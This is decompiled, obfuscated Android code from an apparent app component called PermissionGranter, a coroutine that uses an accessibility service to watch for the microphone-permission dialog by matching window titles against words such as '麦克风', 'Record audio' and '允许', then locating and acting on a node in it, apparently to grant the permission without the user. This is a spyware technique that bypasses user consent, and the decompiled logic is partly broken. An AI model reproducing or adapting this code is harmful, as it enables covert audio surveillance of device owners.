package com.storm.safe.rock.manager;

import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import kotlin.text.AbstractC0779a1;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.PermissionGranter$startMicrophonePermissionDialogMonitoring$1", m214403f = "PermissionGranter.kt", m214404l = {335, 350}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class PermissionGranter$startMicrophonePermissionDialogMonitoring$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52027a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0260a2 f52028a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public PermissionGranter$startMicrophonePermissionDialogMonitoring$1(C0260a2 c0260a2, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52028a2 = c0260a2;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new PermissionGranter$startMicrophonePermissionDialogMonitoring$1(this.f52028a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((PermissionGranter$startMicrophonePermissionDialogMonitoring$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Code restructure failed: missing block: B:61:0x00d8, code lost:
    
        if (p000.b81.m210571b1(1000, r12) == r0) goto L62;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x00f0, code lost:
    
        r13.recycle();
     */
    /* JADX WARN: Removed duplicated region for block: B:13:0x002b  */
    /* JADX WARN: Removed duplicated region for block: B:18:0x003b  */
    /* JADX WARN: Removed duplicated region for block: B:20:0x0041  */
    /* JADX WARN: Removed duplicated region for block: B:21:0x0045  */
    /* JADX WARN: Removed duplicated region for block: B:73:0x00fb  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:54:0x00bc -> B:70:0x00f0). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:61:0x00d8 -> B:63:0x00db). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:69:0x00eb -> B:70:0x00f0). Please report as a decompilation issue!!! */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        String string;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52027a1;
        C0260a2 c0260a2 = this.f52028a2;
        if (i == 0) {
            kg1.m213544f4(obj);
            if (c0260a2.f52113a5) {
            }
            if (c0260a2.f52116a8 >= 8) {
            }
            return C1351vv.f60710b1;
        }
        if (i == 1) {
            kg1.m213544f4(obj);
            if (c0260a2.m211305b3()) {
            }
            if (c0260a2.f52116a8 >= 8) {
            }
            return C1351vv.f60710b1;
        }
        if (i != 2) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        kg1.m213544f4(obj);
        if (c0260a2.m211305b3()) {
            c0260a2.f52113a5 = false;
            if (c0260a2.f52116a8 >= 8) {
                t60.m214726f4("PermissionGranter", "⚠️ [权限] 麦克风权限申请超时");
                c0260a2.f52113a5 = false;
            }
            return C1351vv.f60710b1;
        }
        c0260a2.f52116a8++;
        if (c0260a2.f52113a5 && c0260a2.f52116a8 < 8) {
            this.f52027a1 = 1;
            if (b81.m210571b1(2000L, this) != coroutineSingletons) {
                if (c0260a2.m211305b3()) {
                    c0260a2.f52113a5 = false;
                } else if (dqtvuisjd.f52358m1.isServiceRunning()) {
                    dqtvuisjd dqtvuisjdVar = c0260a2.f52108a0;
                    try {
                    } catch (Exception e) {
                        t60.m214705c6("PermissionGranter", "❌ [权限] 检测权限对话框失败", e);
                    }
                    List<AccessibilityWindowInfo> windows = dqtvuisjdVar.getWindows();
                    if (windows != null && !windows.isEmpty()) {
                        int size = windows.size();
                        for (int i2 = 0; i2 < size; i2++) {
                            CharSequence title = windows.get(i2).getTitle();
                            if (title == null || (string = title.toString()) == null) {
                                string = "";
                            }
                            if (AbstractC0779a1.m213652a5(string, "麦克风", true) || AbstractC0779a1.m213652a5(string, "录音", true) || AbstractC0779a1.m213652a5(string, "Record audio", true) || AbstractC0779a1.m213652a5(string, "音频", true) || AbstractC0779a1.m213652a5(string, "允许", true) || AbstractC0779a1.m213652a5(string, "访问", true)) {
                                c0260a2.m211332h5(string);
                            }
                        }
                    }
                    AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        AccessibilityNodeInfo accessibilityNodeInfoM211287d9 = C0260a2.m211287d9(rootInActiveWindow);
                        if (accessibilityNodeInfoM211287d9 == null) {
                            rootInActiveWindow.recycle();
                        } else if (c0260a2.m211333h6(accessibilityNodeInfoM211287d9)) {
                            accessibilityNodeInfoM211287d9.recycle();
                            rootInActiveWindow.recycle();
                            this.f52027a1 = 2;
                        } else {
                            accessibilityNodeInfoM211287d9.recycle();
                            rootInActiveWindow.recycle();
                        }
                    }
                    c0260a2.f52116a8++;
                    if (c0260a2.f52113a5) {
                        this.f52027a1 = 1;
                        if (b81.m210571b1(2000L, this) != coroutineSingletons) {
                        }
                    }
                } else {
                    t60.m214726f4("PermissionGranter", "⚠️ [权限] 无障碍服务未运行，停止麦克风权限申请");
                    c0260a2.f52113a5 = false;
                }
            }
            return coroutineSingletons;
        }
        if (c0260a2.f52116a8 >= 8) {
        }
        return C1351vv.f60710b1;
    }
}
